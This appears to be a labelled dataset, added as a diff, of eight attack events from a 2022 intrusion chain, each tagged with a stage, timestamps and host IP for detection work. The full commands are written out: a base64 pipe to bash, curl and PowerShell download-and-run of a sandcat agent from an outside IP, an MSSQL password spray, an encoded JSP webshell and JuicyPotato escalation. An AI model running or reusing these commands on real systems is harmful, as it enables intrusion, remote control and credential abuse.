@@ -1,0 +1,82 @@
+[
+  {
+    "id": "A1",
+    "stage": "Initial Access",
+    "match_substring": "d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA==",
+    "full_command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+    "file_path": null,
+    "occurTime_start": "2022-03-25 15:16:18",
+    "occurTime_end": "2022-03-25 15:16:30",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A2",
+    "stage": "Initial Access",
+    "match_substring": "sandcat-linux",
+    "full_command": "curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &\"",
+    "file_path": null,
+    "occurTime_start": "2022-03-25 15:16:18",
+    "occurTime_end": "2022-03-25 15:16:30",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A5",
+    "stage": "Credential Access",
+    "match_substring": "fscan-main.zip",
+    "full_command": "mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+    "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/fscan/main",
+    "occurTime_start": "2022-03-25 15:16:37",
+    "occurTime_end": "2022-03-25 15:16:45",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A3",
+    "stage": "Initial Access",
+    "match_substring": "PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5n",
+    "full_command": "echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9uLiU+PCVwdXRWYWx1ZSgidSIsayk7JT48JUNpcGhlciU+PCVjPSU+PCVDaXBoZXIuJT48JWdldEluc3RhbmNlKCU+PCUiQUVTIik7JT48JWMuaW5pdCglPjwlMixuZXclPjwlU2VjcmV0S2V5U3BlYyhrLiU+PCVnZXRCeXRlcyglPjwlKSwiQUVTIikpOyU+PCVuZXclPjwlVSh0aGlzLmdldENsYXNzKCU+PCUpLmdldENsYXNzTG9hZGVyKCU+PCUpKS4lPjwlZyhjLiU+PCVkb0ZpbmFsKG5ldyU+PCVzdW4uJT48JW1pc2MuJT48JUJBU0U2NERlY29kZXIlPjwlKCU+PCUpLiU+PCVkZWNvZGVCdWZmZXIlPjwlKHJlcXVlc3QlPjwlLiU+PCVnZXRSZWFkZXIoJT48JSkuJT48JXJ",
+    "file_path": null,
+    "occurTime_start": "2022-03-25 15:16:38",
+    "occurTime_end": "2022-03-25 15:16:41",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A4",
+    "stage": "Persistence",
+    "match_substring": null,
+    "full_command": "whoami",
+    "file_path": null,
+    "occurTime_start": "2022-03-25 15:16:38",
+    "occurTime_end": "2022-03-25 15:16:49",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A6",
+    "stage": "Lateral Movement",
+    "match_substring": "sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+    "full_command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+    "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx",
+    "occurTime_start": "2022-03-25 15:16:47",
+    "occurTime_end": "2022-03-25 15:16:47",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A7",
+    "stage": "Lateral Movement",
+    "match_substring": "Public\\sandcat.exe",
+    "full_command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\\\"https://124.223.85.207:8443\\\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\\\"/file/download\\\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\\\"company_code\\\",1234567);$wc.Headers.add(\\\"platform\\\",\\\"windows\\\");$wc.Headers.add(\\\"file\\\",\\\"sandcat.go\\\"); $output=\\\"C:\\Users\\Public\\sandcat.exe\\\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443'",
+    "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx",
+    "occurTime_start": "2022-03-25 15:16:47",
+    "occurTime_end": "2022-03-25 15:17:30",
+    "hostIp": "192.168.0.155"
+  },
+  {
+    "id": "A8",
+    "stage": "Privilege Escalation",
+    "match_substring": "JuicyPotato_x64.exe",
+    "full_command": "JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami",
+    "file_path": "C:\\Users\\Public\\JuicyPotato_x64.exe",
+    "occurTime_start": "2022-03-25 15:18:20",
+    "occurTime_end": "2022-03-25 15:18:43",
+    "hostIp": "192.168.0.244"
+  }
+]
